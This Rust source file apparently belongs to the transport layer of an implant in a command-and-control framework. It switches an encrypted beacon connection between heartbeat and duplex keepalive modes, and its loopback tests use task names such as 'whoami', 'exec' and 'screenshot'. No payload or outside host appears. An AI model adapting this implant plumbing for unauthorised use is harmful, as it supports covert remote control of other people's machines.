use futures::channel::mpsc;
use futures::FutureExt;
use futures::SinkExt;
use malefic_common::debug;
use malefic_proto::proto::implantpb::Spites;

use crate::{Connection, ConnectionReader, ConnectionWriter, TransportError};
use malefic_common::{spawn, Handle};

enum ConnectionMode {
    Heartbeat,
    Duplex {
        read_rx: mpsc::UnboundedReceiver<Result<Spites, TransportError>>,
        read_handle: Handle<ConnectionReader>,
        stop_tx: Option<futures::channel::oneshot::Sender<()>>,
    },
}

pub struct ConnectionRunner {
    reader: Option<ConnectionReader>,
    writer: ConnectionWriter,
    mode: ConnectionMode,
}

impl ConnectionRunner {
    pub fn new(connection: Connection) -> Self {
        let (reader, writer) = connection.split();
        Self {
            reader: Some(reader),
            writer,
            mode: ConnectionMode::Heartbeat,
        }
    }

    pub fn new_from_split(reader: ConnectionReader, writer: ConnectionWriter) -> Self {
        Self {
            reader: Some(reader),
            writer,
            mode: ConnectionMode::Heartbeat,
        }
    }

    pub fn new_duplex(connection: Connection) -> Result<Self, TransportError> {
        let mut runner = Self::new(connection);
        runner.upgrade()?;
        Ok(runner)
    }

    pub async fn send(&mut self, spites: Spites) -> Result<(), TransportError> {
        self.writer.send(spites).await
    }

    /// Receive one frame in heartbeat mode.
    ///
    /// Returns `Ok(None)` on idle no-data timeout. If a partial frame times out,
    /// returns `Err(TransportError::Deadline)` and the current frame is discarded.
    pub async fn receive(&mut self) -> Result<Option<Spites>, TransportError> {
        let reader = self
            .reader
            .as_mut()
            .ok_or_else(|| TransportError::ConnectFailed("Reader not available".to_string()))?;

        reader.poll().await
    }

    pub fn try_receive(&mut self) -> Result<Option<Spites>, TransportError> {
        match &mut self.mode {
            ConnectionMode::Duplex { read_rx, .. } => match read_rx.try_next() {
                Ok(Some(Ok(spites))) => Ok(Some(spites)),
                Ok(Some(Err(e))) => Err(e),
                Ok(None) => Err(TransportError::ConnectFailed(
                    "Read channel closed".to_string(),
                )),
                Err(_) => Ok(None),
            },
            ConnectionMode::Heartbeat => Err(TransportError::ConnectFailed(
                "try_receive only available in Duplex mode".to_string(),
            )),
        }
    }

    pub fn upgrade(&mut self) -> Result<(), TransportError> {
        debug!("[runner] Upgrading to Duplex mode");
        let mut reader = self
            .reader
            .take()
            .ok_or_else(|| TransportError::ConnectFailed("Reader already taken".to_string()))?;

        let (mut read_tx, read_rx) = mpsc::unbounded();
        let (stop_tx, mut stop_rx) = futures::channel::oneshot::channel::<()>();
        let read_handle = spawn(async move {
            loop {
                let recv = reader.poll();
                futures::pin_mut!(recv);
                let mut stop = (&mut stop_rx).fuse();
                futures::select! {
                    result = recv.fuse() => {
                        match result {
                            Ok(Some(spites)) => {
                                if read_tx.send(Ok(spites)).await.is_err() {
                                    debug!("[runner] Read channel closed, stopping");
                                    break;
                                }
                            }
                            Ok(None) => {
                                continue;
                            }
                            Err(e) => {
                                debug!("[runner] Read error: {:?}", e);
                                let _ = read_tx.send(Err(e)).await;
                                break;
                            }
                        }
                    }
                    _ = stop => {
                        debug!("[runner] Stop signal received");
                        break;
                    }
                }
            }
            debug!("[runner] Read coroutine stopped");
            reader
        });

        self.mode = ConnectionMode::Duplex {
            read_rx,
            read_handle,
            stop_tx: Some(stop_tx),
        };
        Ok(())
    }

    pub async fn downgrade(&mut self) -> Result<(), TransportError> {
        debug!("[runner] Downgrading to Heartbeat mode");
        let old_mode = std::mem::replace(&mut self.mode, ConnectionMode::Heartbeat);
        if let ConnectionMode::Duplex {
            read_handle,
            stop_tx,
            ..
        } = old_mode
        {
            if let Some(tx) = stop_tx {
                let _ = tx.send(());
            }
            let reader = malefic_common::join_handle(read_handle)
                .await
                .map_err(|e| {
                    TransportError::ConnectFailed(format!("Failed to join read task: {}", e))
                })?;
            self.reader = Some(reader);
        }
        Ok(())
    }
}

/// # Transport & Keepalive Tests
///
/// Test design:
///   1. Transport layer  — heartbeat/duplex basic operations
///   2. Mode switching    — upgrade/downgrade with data integrity
///   3. Keepalive scenarios — application-level protocol (beacon.rs/stub.rs)
///   4. Performance       — throughput & latency measurement
///
/// All tests use real TCP loopback connections, no mocks.
/// Run with: `cargo test -p malefic-transport --features tokio`
#[cfg(all(test, feature = "tcp", feature = "tokio"))]
mod keepalive_tests {
    use std::time::{Duration, Instant};

    use async_net::{TcpListener, TcpStream};
    use malefic_crypto::crypto::new_cryptor;
    use malefic_proto::proto::implantpb::spite::Body;
    use malefic_proto::proto::modulepb;
    use malefic_proto::{new_empty_spite, new_spite, Spites};

    use crate::tcp::TCPTransport;
    use crate::{ConnectionBuilder, ConnectionRunner, SessionConfig, TransportError};

    // ====================================================================
    // Helpers
    // ====================================================================

    async fn create_tcp_pair() -> (TcpStream, TcpStream) {
        let listener = TcpListener::bind("127.0.0.1:0").await.unwrap();
        let addr = listener.local_addr().unwrap();
        let client = TcpStream::connect(addr).await.unwrap();
        let (server, _) = listener.accept().await.unwrap();
        (client, server)
    }

    fn make_cryptor() -> malefic_crypto::crypto::Cryptor {
        new_cryptor(vec![0x42; 32], vec![0xAB; 16])
    }

    fn make_config() -> SessionConfig {
        SessionConfig {
            read_chunk_size: 8192,
            deadline: Duration::from_millis(500),
        }
    }

    async fn create_runner_pair() -> (ConnectionRunner, ConnectionRunner) {
        let (client_stream, server_stream) = create_tcp_pair().await;
        let session_id = [1, 2, 3, 4];

        let client_conn = ConnectionBuilder::new(TCPTransport::new_plain(client_stream))
            .with_cryptor(make_cryptor())
            .with_session_id(session_id)
            .with_config(make_config())
            .build()
            .unwrap();

        let server_conn = ConnectionBuilder::new(TCPTransport::new_plain(server_stream))
            .with_cryptor(make_cryptor())
            .with_session_id(session_id)
            .with_config(make_config())
            .build()
            .unwrap();

        (
            ConnectionRunner::new(client_conn),
            ConnectionRunner::new(server_conn),
        )
    }

    fn make_spites(task_id: u32, name: &str) -> Spites {
        Spites {
            spites: vec![new_empty_spite(task_id, name.to_string())],
        }
    }

    fn make_sized_spites(task_id: u32, payload_size: usize) -> Spites {
        Spites {
            spites: vec![new_empty_spite(task_id, "X".repeat(payload_size))],
        }
    }

    fn wire_bytes(spites: &Spites) -> usize {
        malefic_proto::marshal([1, 2, 3, 4], spites.clone(), None)
            .unwrap()
            .pack()
            .len()
    }

    fn make_ping(task_id: u32) -> Spites {
        Spites {
            spites: vec![new_spite(
                task_id,
                "ping".to_string(),
                Body::Ping(modulepb::Ping {
                    nonce: task_id as i32,
                }),
            )],
        }
    }

    fn make_task_cmd(task_id: u32, name: &str) -> Spites {
        Spites {
            spites: vec![new_spite(
                task_id,
                name.to_string(),
                Body::Empty(malefic_proto::proto::implantpb::Empty::default()),
            )],
        }
    }

    fn make_keepalive_cmd(task_id: u32, enable: bool) -> Spites {
        Spites {
            spites: vec![new_spite(
                task_id,
                "keepalive".to_string(),
                Body::Common(modulepb::CommonBody {
                    bool_array: vec![enable],
                    ..Default::default()
                }),
            )],
        }
    }

    /// Parse keepalive command from received Spites (mirrors stub.rs logic).
    fn parse_keepalive(spites: &Spites) -> Option<bool> {
        for spite in &spites.spites {
            if spite.name == "keepalive" {
                if let Some(Body::Common(common)) = &spite.body {
                    return Some(common.bool_array.first().copied().unwrap_or(false));
                }
                return Some(false);
            }
        }
        None
    }

    /// Poll try_receive with timeout (for duplex mode).
    async fn poll_try_receive(
        runner: &mut ConnectionRunner,
        timeout: Duration,
    ) -> Result<Option<Spites>, crate::TransportError> {
        let deadline = std::time::Instant::now() + timeout;
        loop {
            match runner.try_receive() {
                Ok(Some(s)) => return Ok(Some(s)),
                Ok(None) if std::time::Instant::now() >= deadline => return Ok(None),
                Ok(None) => malefic_common::sleep(Duration::from_millis(1)).await,
                Err(e) => return Err(e),
            }
        }
    }

    // ====================================================================
    // 1. Transport layer — heartbeat & duplex basic operations
    // ====================================================================

    /// Heartbeat mode: bidirectional exchange and read timeout.
    #[tokio::test(flavor = "multi_thread", worker_threads = 2)]
    async fn test_heartbeat_exchange() {
        let (mut client, mut server) = create_runner_pair().await;

        // Bidirectional send/receive
        for i in 0u32..3 {
            client
                .send(make_spites(i, &format!("req_{}", i)))
                .await
                .unwrap();
            let r = server.receive().await.unwrap().unwrap();
            assert_eq!(r.spites[0].task_id, i);

            server
                .send(make_spites(i + 100, &format!("resp_{}", i)))
                .await
                .unwrap();
            let r = client.receive().await.unwrap().unwrap();
            assert_eq!(r.spites[0].task_id, i + 100);
        }

        // Read timeout with no data → Ok(None)
        let r = client.receive().await.unwrap();
        assert!(r.is_none(), "no data should return None on idle timeout");
    }

    /// Mode boundary: wrong API in wrong mode, double upgrade.
    #[tokio::test(flavor = "multi_thread", worker_threads = 2)]
    async fn test_mode_boundary_enforcement() {
        let (mut client, _server) = create_runner_pair().await;

        // try_receive fails in heartbeat mode
        assert!(client.try_receive().is_err());

        // Upgrade to duplex
        client.upgrade().unwrap();

        // receive() fails in duplex mode (reader taken)
        assert!(client.receive().await.is_err());

        // Double upgrade fails
        assert!(client.upgrade().is_err());
    }

    /// Duplex mode: try_receive (empty + data), send, message ordering.
    #[tokio::test(flavor = "multi_thread", worker_threads = 2)]
    async fn test_duplex_exchange() {
        let (mut client, mut server) = create_runner_pair().await;
        client.upgrade().unwrap();

        // No data → Ok(None)
        assert!(matches!(client.try_receive(), Ok(None)));

        // Client can still send in duplex mode
        client.send(make_spites(1, "out")).await.unwrap();
        let r = server.receive().await.unwrap().unwrap();
        assert_eq!(r.spites[0].name, "out");

        // Server sends multiple messages → client receives in order
        for i in 0u32..5 {
            server
                .send(make_spites(i, &format!("msg_{}", i)))
                .await
                .unwrap();
        }
        tokio::time::sleep(Duration::from_millis(100)).await;
        for i in 0u32..5 {
            let r = client.try_receive().unwrap().unwrap();
            assert_eq!(r.spites[0].task_id, i);
        }
    }

    /// Idle duplex periods should not kill the background task. Data arriving
    /// later must still be delivered.
    #[tokio::test(flavor = "multi_thread", worker_threads = 2)]
    async fn test_duplex_survives_idle_timeout() {
        let (mut client, mut server) = create_runner_pair().await;
        client.upgrade().unwrap();

        // Idle 3x session deadline (1500ms > 500ms) — task must survive.
        tokio::time::sleep(Duration::from_millis(1500)).await;
        assert!(
            matches!(client.try_receive(), Ok(None)),
            "idle duplex should stay alive across multiple idle timeouts"
        );

        // Data sent after idle period should still arrive.
        server.send(make_spites(1, "late")).await.unwrap();
        tokio::time::sleep(Duration::from_millis(100)).await;
        let r = client.try_receive().unwrap().unwrap();
        assert_eq!(r.spites[0].name, "late");
    }

    /// Heartbeat receive timeout with partial frame (1 byte received then blocked).
    /// Verifies timeout completes correctly even when frame is incomplete.
    #[tokio::test(flavor = "multi_thread", worker_threads = 2)]
    async fn test_heartbeat_timeout_partial_frame() {
        use async_net::{TcpListener, TcpStream};
        use futures::AsyncWriteExt;

        // Listen on random port
        let listener = TcpListener::bind("127.0.0.1:0").await.unwrap();
        let addr = listener.local_addr().unwrap();

        // Accept connection but only send 1 byte then stall forever
        tokio::spawn(async move {
            let (mut stream, _) = listener.accept().await.unwrap();
            // Send only 1 byte — not enough for a full header (header needs 10 bytes)
            stream.write_all(&[0x42]).await.unwrap();
            // Flush and stall — never close, never send more
            stream.flush().await.unwrap();
            futures::future::pending::<()>().await;
        });

        // Connect client
        let stream = TcpStream::connect(addr).await.unwrap();
        let session_id = [1, 2, 3, 4];
        let conn = ConnectionBuilder::new(TCPTransport::new_plain(stream))
            .with_cryptor(make_cryptor())
            .with_session_id(session_id)
            .with_config(SessionConfig {
                read_chunk_size: 8192,
                deadline: Duration::from_millis(500), // short deadline for test
            })
            .build()
            .unwrap();
        let mut client = ConnectionRunner::new(conn);

        // receive() should return Err(Deadline) within ~500ms, not hang forever
        let start = Instant::now();
        let r = client.receive().await;
        let elapsed = start.elapsed();

        assert!(matches!(r, Err(TransportError::Deadline)));
        assert!(
            elapsed < Duration::from_millis(1500),
            "timeout should fire reasonably quickly"
        );
    }

    /// Exchange deadline when server never responds.
    /// Verifies the connection-level deadline bounds the initial request/response round trip.
    #[tokio::test(flavor = "multi_thread", worker_threads = 2)]
    async fn test_exchange_deadline_no_response() {
        use async_net::{TcpListener, TcpStream};

        // Listen but never send any response after accept
        let listener = TcpListener::bind("127.0.0.1:0").await.unwrap();
        let addr = listener.local_addr().unwrap();

        tokio::spawn(async move {
            let (_stream, _) = listener.accept().await.unwrap();
            // Just accept, never send anything
            futures::future::pending::<()>().await;
        });

        // Connect and do an exchange
        let stream = TcpStream::connect(addr).await.unwrap();
        let session_id = [1, 2, 3, 4];
        let conn = ConnectionBuilder::new(TCPTransport::new_plain(stream))
            .with_cryptor(make_cryptor())
            .with_session_id(session_id)
            .with_config(SessionConfig {
                read_chunk_size: 8192,
                deadline: Duration::from_millis(500),
            })
            .build()
            .unwrap();

        let start = Instant::now();
        let r = conn.exchange(make_spites(1, "hello")).await;
        let elapsed = start.elapsed();

        // Should get Deadline error within ~500ms
        assert!(matches!(r, Err(crate::TransportError::Deadline)));
        assert!(elapsed < Duration::from_millis(1500));
    }

    /// Send-only register path should not require any response from the server.
    #[tokio::test(flavor = "multi_thread", worker_threads = 2)]
    async fn test_send_only_does_not_require_response() {
        use async_net::{TcpListener, TcpStream};

        let listener = TcpListener::bind("127.0.0.1:0").await.unwrap();
        let addr = listener.local_addr().unwrap();

        tokio::spawn(async move {
            let (_stream, _) = listener.accept().await.unwrap();
            futures::future::pending::<()>().await;
        });

        let stream = TcpStream::connect(addr).await.unwrap();
        let session_id = [1, 2, 3, 4];
        let conn = ConnectionBuilder::new(TCPTransport::new_plain(stream))
            .with_cryptor(make_cryptor())
            .with_session_id(session_id)
            .with_config(SessionConfig {
                read_chunk_size: 8192,
                deadline: Duration::from_millis(500),
            })
            .build()
            .unwrap();

        let start = Instant::now();
        let r = conn.send_only(make_spites(1, "register")).await;
        let elapsed = start.elapsed();

        assert!(
            r.is_ok(),
            "send-only register should succeed without response"
        );
        assert!(
            elapsed < Duration::from_millis(500),
            "send-only register should not wait for a response"
        );
    }

    // ====================================================================
    // 2. Mode switching — upgrade/downgrade with data integrity
    // ====================================================================

    /// Full heartbeat → duplex → heartbeat cycle.
    /// Verifies data integrity and AES-CTR counter sync across transitions.
    #[tokio::test(flavor = "multi_thread", worker_threads = 2)]
    async fn test_upgrade_downgrade_data_integrity() {
        let (mut client, mut server) = create_runner_pair().await;

        // Phase 1: Heartbeat
        client.send(make_spites(1, "hb1")).await.unwrap();
        assert_eq!(
            server.receive().await.unwrap().unwrap().spites[0].name,
            "hb1"
        );
        server.send(make_spites(2, "hb1_r")).await.unwrap();
        assert_eq!(
            client.receive().await.unwrap().unwrap().spites[0].name,
            "hb1_r"
        );

        // Phase 2: Duplex — bidirectional
        client.upgrade().unwrap();
        client.send(make_spites(3, "dup_out")).await.unwrap();
        assert_eq!(
            server.receive().await.unwrap().unwrap().spites[0].name,
            "dup_out"
        );
        server.send(make_spites(4, "dup_in")).await.unwrap();
        tokio::time::sleep(Duration::from_millis(50)).await;
        assert_eq!(
            client.try_receive().unwrap().unwrap().spites[0].name,
            "dup_in"
        );

        // Phase 3: Back to heartbeat — cryptor still in sync
        client.downgrade().await.unwrap();
        client.send(make_spites(5, "hb2")).await.unwrap();
        assert_eq!(
            server.receive().await.unwrap().unwrap().spites[0].name,
            "hb2"
        );
        server.send(make_spites(6, "hb2_r")).await.unwrap();
        assert_eq!(
            client.receive().await.unwrap().unwrap().spites[0].name,
            "hb2_r"
        );
    }

    // ====================================================================
    // 3. Keepalive scenarios — application-level protocol
    // ====================================================================

    /// Non-keepalive: pure heartbeat loop, server never sends KeepAlive cmd.
    #[tokio::test(flavor = "multi_thread", worker_threads = 2)]
    async fn test_scenario_heartbeat_only() {
        let (mut client, mut server) = create_runner_pair().await;
        let mut keepalive_enabled = false;

        // Simulate beacon.rs heartbeat loop with task responses
        let tasks = ["ls", "pwd", "whoami"];
        for (i, task) in tasks.iter().enumerate() {
            let tid = i as u32;
            client.send(make_ping(tid)).await.unwrap();
            let _ = server.receive().await.unwrap().unwrap();
            server.send(make_task_cmd(tid, task)).await.unwrap();

            let resp = client.receive().await.unwrap().unwrap();
            assert_eq!(resp.spites[0].name, *task);
            if let Some(en) = parse_keepalive(&resp) {
                keepalive_enabled = en;
            }
        }

        assert!(!keepalive_enabled, "should never enter keepalive");
        assert!(
            client.try_receive().is_err(),
            "should stay in heartbeat mode"
        );
    }

    /// Full keepalive lifecycle (mirrors beacon.rs + stub.rs):
    ///   heartbeat → KeepAlive(true) → upgrade → duplex exchange
    ///   → KeepAlive(false) → downgrade → resume heartbeat
    #[tokio::test(flavor = "multi_thread", worker_threads = 2)]
    async fn test_scenario_keepalive_lifecycle() {
        let (mut client, mut server) = create_runner_pair().await;
        let mut keepalive_enabled = false;

        // Heartbeat phase
        client.send(make_ping(0)).await.unwrap();
        let _ = server.receive().await.unwrap().unwrap();
        server.send(make_ping(100)).await.unwrap();
        let _ = client.receive().await.unwrap().unwrap();

        // Server enables keepalive
        client.send(make_ping(1)).await.unwrap();
        let _ = server.receive().await.unwrap().unwrap();
        server.send(make_keepalive_cmd(1, true)).await.unwrap();
        let resp = client.receive().await.unwrap().unwrap();
        if let Some(en) = parse_keepalive(&resp) {
            keepalive_enabled = en;
        }
        assert!(keepalive_enabled);

        // Upgrade to duplex
        client.upgrade().unwrap();

        // Duplex exchange: server pushes tasks, client responds
        for i in 0u32..5 {
            server.send(make_task_cmd(10 + i, "exec")).await.unwrap();
        }
        for _ in 0..5 {
            let r = poll_try_receive(&mut client, Duration::from_secs(2))
                .await
                .unwrap()
                .unwrap();
            assert_eq!(r.spites[0].name, "exec");
            client
                .send(make_spites(r.spites[0].task_id, "result"))
                .await
                .unwrap();
            let _ = server.receive().await.unwrap().unwrap();
        }

        // Client sends periodic heartbeat during duplex
        client.send(make_ping(99)).await.unwrap();
        assert_eq!(
            server.receive().await.unwrap().unwrap().spites[0].name,
            "ping"
        );

        // Server disables keepalive
        server.send(make_keepalive_cmd(20, false)).await.unwrap();
        let r = poll_try_receive(&mut client, Duration::from_secs(2))
            .await
            .unwrap()
            .unwrap();
        if let Some(en) = parse_keepalive(&r) {
            keepalive_enabled = en;
        }
        assert!(!keepalive_enabled);

        // Downgrade and resume heartbeat
        client.downgrade().await.unwrap();
        client.send(make_ping(30)).await.unwrap();
        assert_eq!(
            server.receive().await.unwrap().unwrap().spites[0].task_id,
            30
        );
        server.send(make_ping(130)).await.unwrap();
        assert_eq!(
            client.receive().await.unwrap().unwrap().spites[0].task_id,
            130
        );
    }

    /// Edge case: enable keepalive then immediately disable before any
    /// duplex exchange. Tests graceful handling of zero-length duplex phase.
    #[tokio::test(flavor = "multi_thread", worker_threads = 2)]
    async fn test_scenario_keepalive_rapid_toggle() {
        let (mut client, mut server) = create_runner_pair().await;
        let mut keepalive_enabled = false;

        // Enable
        client.send(make_ping(0)).await.unwrap();
        let _ = server.receive().await.unwrap().unwrap();
        server.send(make_keepalive_cmd(0, true)).await.unwrap();
        let resp = client.receive().await.unwrap().unwrap();
        if let Some(en) = parse_keepalive(&resp) {
            keepalive_enabled = en;
        }
        assert!(keepalive_enabled);
        client.upgrade().unwrap();

        // Immediately disable — no duplex exchange happened
        server.send(make_keepalive_cmd(1, false)).await.unwrap();
        let r = poll_try_receive(&mut client, Duration::from_secs(2))
            .await
            .unwrap()
            .unwrap();
        if let Some(en) = parse_keepalive(&r) {
            keepalive_enabled = en;
        }
        assert!(!keepalive_enabled);

        // Downgrade and verify heartbeat
        client.downgrade().await.unwrap();
        client.send(make_ping(2)).await.unwrap();
        assert_eq!(
            server.receive().await.unwrap().unwrap().spites[0].task_id,
            2
        );
        server.send(make_ping(3)).await.unwrap();
        assert_eq!(
            client.receive().await.unwrap().unwrap().spites[0].task_id,
            3
        );
    }

    /// Keepalive disable arrives mixed in task stream. Verifies:
    /// - Message ordering preserved
    /// - Disable command identified among regular tasks
    /// - Tasks after disable still delivered
    #[tokio::test(flavor = "multi_thread", worker_threads = 2)]
    async fn test_scenario_keepalive_disable_among_tasks() {
        let (mut client, mut server) = create_runner_pair().await;
        let mut keepalive_enabled = false;

        // Enable keepalive + upgrade
        client.send(make_ping(0)).await.unwrap();
        let _ = server.receive().await.unwrap().unwrap();
        server.send(make_keepalive_cmd(0, true)).await.unwrap();
        let resp = client.receive().await.unwrap().unwrap();
        if let Some(en) = parse_keepalive(&resp) {
            keepalive_enabled = en;
        }
        assert!(keepalive_enabled);
        client.upgrade().unwrap();

        // Server sends: task, task, keepalive_disable, task
        server.send(make_task_cmd(1, "upload")).await.unwrap();
        server.send(make_task_cmd(2, "download")).await.unwrap();
        server.send(make_keepalive_cmd(3, false)).await.unwrap();
        server.send(make_task_cmd(4, "screenshot")).await.unwrap();

        // Client receives all 4 in order
        let mut tasks = Vec::new();
        let mut disable_after_n_tasks = 0;
        for _ in 0..4 {
            let r = poll_try_receive(&mut client, Duration::from_secs(5))
                .await
                .unwrap()
                .unwrap();
            if let Some(en) = parse_keepalive(&r) {
                keepalive_enabled = en;
                disable_after_n_tasks = tasks.len();
            } else {
                tasks.push(r.spites[0].name.clone());
            }
        }

        assert!(!keepalive_enabled);
        assert_eq!(disable_after_n_tasks, 2, "disable arrived after 2 tasks");
        assert_eq!(tasks, vec!["upload", "download", "screenshot"]);

        client.downgrade().await.unwrap();
    }

    // ====================================================================
    // 4. Performance — throughput & latency
    // ====================================================================

    /// Combined throughput test: heartbeat and duplex modes with varying
    /// payload sizes. Measures pkt/s and KB/s for each combination.
    #[tokio::test(flavor = "multi_thread", worker_threads = 2)]
    async fn test_perf_throughput() {
        let payloads: &[(usize, u32, &str)] = &[
            (26, 200, "small"), // ~26B wire (name="ping")
            (1024, 200, "1KB"),
            (8192, 100, "8KB"),
        ];

        // --- Heartbeat mode ---
        for &(payload_size, count, label) in payloads {
            let (mut client, mut server) = create_runner_pair().await;
            let msg = make_sized_spites(0, payload_size);
            let bpm = wire_bytes(&msg);

            let start = tokio::time::Instant::now();
            for i in 0..count {
                client
                    .send(make_sized_spites(i, payload_size))
                    .await
                    .unwrap();
                let _ = server.receive().await.unwrap().unwrap();
            }
            let elapsed = start.elapsed();
            let pps = count as f64 / elapsed.as_secs_f64();
            let kbps = (bpm * count as usize) as f64 / elapsed.as_secs_f64() / 1024.0;
            println!(
                "[perf] heartbeat {}: {:.0} pkt/s, {:.1} KB/s ({}B/msg)",
                label, pps, kbps, bpm
            );
            assert!(elapsed.as_secs() < 30);
        }

        // --- Duplex mode ---
        for &(payload_size, count, label) in payloads {
            let (mut client, mut server) = create_runner_pair().await;
            client.upgrade().unwrap();
            let msg = make_sized_spites(0, payload_size);
            let bpm = wire_bytes(&msg);

            let start = tokio::time::Instant::now();
            for i in 0..count {
                server
                    .send(make_sized_spites(i, payload_size))
                    .await
                    .unwrap();
            }
            let mut received = 0u32;
            let deadline = start + Duration::from_secs(30);
            while received < count {
                assert!(tokio::time::Instant::now() < deadline, "timed out");
                match client.try_receive() {
                    Ok(Some(_)) => received += 1,
                    Ok(None) => tokio::time::sleep(Duration::from_millis(1)).await,
                    Err(e) => panic!("error: {:?}", e),
                }
            }
            let elapsed = start.elapsed();
            let pps = count as f64 / elapsed.as_secs_f64();
            let kbps = (bpm * count as usize) as f64 / elapsed.as_secs_f64() / 1024.0;
            println!(
                "[perf] duplex   {}: {:.0} pkt/s, {:.1} KB/s ({}B/msg)",
                label, pps, kbps, bpm
            );
            assert!(elapsed.as_secs() < 30);
        }
    }

    /// Mode switch latency: measures upgrade + downgrade round-trip cost.
    #[tokio::test(flavor = "multi_thread", worker_threads = 2)]
    async fn test_perf_mode_switch_latency() {
        let (mut client, _server) = create_runner_pair().await;
        let cycles = 10u32;

        let start = tokio::time::Instant::now();
        for _ in 0..cycles {
            client.upgrade().unwrap();
            client.downgrade().await.unwrap();
        }
        let elapsed = start.elapsed();
        let avg_ms = elapsed.as_millis() as f64 / cycles as f64;
        println!(
            "[perf] mode switch: {} cycles, avg {:.1}ms/cycle",
            cycles, avg_ms
        );
        assert!(elapsed.as_secs() < 15);
    }

    // ====================================================================
    // 5. Additional coverage — concurrency, disconnects, large payloads
    // ====================================================================

    /// Duplex concurrent send/receive: 50 messages each direction simultaneously.
    #[tokio::test(flavor = "multi_thread", worker_threads = 2)]
    async fn test_duplex_concurrent_send_receive() {
        let (mut client, mut server) = create_runner_pair().await;
        client.upgrade().unwrap();

        const N: u32 = 50;

        // Spawn a task for the server to send N messages to the client
        let server_send_handle = tokio::spawn(async move {
            for i in 0..N {
                server
                    .send(make_spites(1000 + i, &format!("s2c_{}", i)))
                    .await
                    .unwrap();
            }
            // Also collect N messages from the client
            let mut received = Vec::new();
            for _ in 0..N {
                let r = server.receive().await.unwrap().unwrap();
                received.push(r.spites[0].task_id);
            }
            received
        });

        // Client sends N messages to the server
        for i in 0..N {
            client
                .send(make_spites(2000 + i, &format!("c2s_{}", i)))
                .await
                .unwrap();
        }

        // Client receives N messages from the server via try_receive
        let mut client_received = Vec::new();
        let deadline = tokio::time::Instant::now() + Duration::from_secs(10);
        while (client_received.len() as u32) < N {
            assert!(
                tokio::time::Instant::now() < deadline,
                "timed out waiting for client messages"
            );
            match client.try_receive() {
                Ok(Some(r)) => client_received.push(r.spites[0].task_id),
                Ok(None) => tokio::time::sleep(Duration::from_millis(1)).await,
                Err(e) => panic!("try_receive error: {:?}", e),
            }
        }

        let server_received = tokio::time::timeout(Duration::from_secs(10), server_send_handle)
            .await
            .expect("server task timed out")
            .expect("server task panicked");

        // Verify all 50 arrived on each side
        assert_eq!(client_received.len(), N as usize);
        assert_eq!(server_received.len(), N as usize);

        // All expected task_ids present (order preserved per TCP)
        for i in 0..N {
            assert_eq!(client_received[i as usize], 1000 + i);
            assert_eq!(server_received[i as usize], 2000 + i);
        }
    }

    /// Duplex error on server disconnect: client detects EOF.
    #[tokio::test(flavor = "multi_thread", worker_threads = 2)]
    async fn test_duplex_error_on_server_disconnect() {
        let (mut client, server) = create_runner_pair().await;
        client.upgrade().unwrap();

        // Drop the server to close the connection
        drop(server);

        // Poll try_receive — should eventually return Err (read loop detects EOF)
        let deadline = tokio::time::Instant::now() + Duration::from_secs(5);
        loop {
            assert!(
                tokio::time::Instant::now() < deadline,
                "timed out: client never detected server disconnect"
            );
            match client.try_receive() {
                Err(_) => break, // Expected: connection closed / read error
                Ok(None) => tokio::time::sleep(Duration::from_millis(10)).await,
                Ok(Some(_)) => panic!("should not receive data from dropped server"),
            }
        }
    }

    /// Downgrade completes within a reasonable time (session deadline is 500ms).
    #[tokio::test(flavor = "multi_thread", worker_threads = 2)]
    async fn test_downgrade_completes_within_timeout() {
        let (mut client, mut server) = create_runner_pair().await;
        client.upgrade().unwrap();

        let start = tokio::time::Instant::now();
        client.downgrade().await.unwrap();
        let elapsed = start.elapsed();

        // Downgrade waits for the read task to stop. With 500ms read timeout,
        // worst case is one read timeout cycle before stop_signal is checked.
        assert!(
            elapsed < Duration::from_secs(2),
            "downgrade took {:?}, expected < 2s",
            elapsed
        );

        // Verify heartbeat mode works after downgrade
        client.send(make_spites(1, "post_downgrade")).await.unwrap();
        let r = server.receive().await.unwrap().unwrap();
        assert_eq!(r.spites[0].name, "post_downgrade");

        server.send(make_spites(2, "reply")).await.unwrap();
        let r = client.receive().await.unwrap().unwrap();
        assert_eq!(r.spites[0].name, "reply");
    }

    /// Heartbeat large payload: 64KB message tests chunked read path.
    #[tokio::test(flavor = "multi_thread", worker_threads = 2)]
    async fn test_heartbeat_large_payload() {
        let (mut client, mut server) = create_runner_pair().await;

        // Send 64KB payload (read_chunk_size=8192, so ~8 chunks)
        let large_msg = make_sized_spites(1, 65536);
        client.send(large_msg).await.unwrap();

        let r = server.receive().await.unwrap().unwrap();
        assert_eq!(r.spites[0].task_id, 1);
        assert_eq!(r.spites[0].name.len(), 65536);

        // Server sends 64KB back
        let large_reply = make_sized_spites(2, 65536);
        server.send(large_reply).await.unwrap();

        let r = client.receive().await.unwrap().unwrap();
        assert_eq!(r.spites[0].task_id, 2);
        assert_eq!(r.spites[0].name.len(), 65536);
    }

    /// Multiple upgrade/downgrade cycles: 5 full cycles with data exchange.
    /// Verifies crypto counters stay in sync throughout.
    #[tokio::test(flavor = "multi_thread", worker_threads = 2)]
    async fn test_multiple_upgrade_downgrade_cycles() {
        let (mut client, mut server) = create_runner_pair().await;

        for cycle in 0u32..5 {
            let base = cycle * 100;

            // Upgrade to duplex
            client.upgrade().unwrap();

            // Server sends, client receives via try_receive
            server
                .send(make_spites(base + 1, &format!("dup_s2c_{}", cycle)))
                .await
                .unwrap();
            let r = poll_try_receive(&mut client, Duration::from_secs(2))
                .await
                .unwrap()
                .expect("expected message from server in duplex");
            assert_eq!(r.spites[0].task_id, base + 1);

            // Client sends, server receives
            client
                .send(make_spites(base + 2, &format!("dup_c2s_{}", cycle)))
                .await
                .unwrap();
            let r = server.receive().await.unwrap().unwrap();
            assert_eq!(r.spites[0].task_id, base + 2);

            // Downgrade to heartbeat
            client.downgrade().await.unwrap();

            // Client sends in heartbeat, server receives
            client
                .send(make_spites(base + 3, &format!("hb_c2s_{}", cycle)))
                .await
                .unwrap();
            let r = server.receive().await.unwrap().unwrap();
            assert_eq!(r.spites[0].task_id, base + 3);

            // Server sends in heartbeat, client receives
            server
                .send(make_spites(base + 4, &format!("hb_s2c_{}", cycle)))
                .await
                .unwrap();
            let r = client.receive().await.unwrap().unwrap();
            assert_eq!(r.spites[0].task_id, base + 4);
        }
    }
}
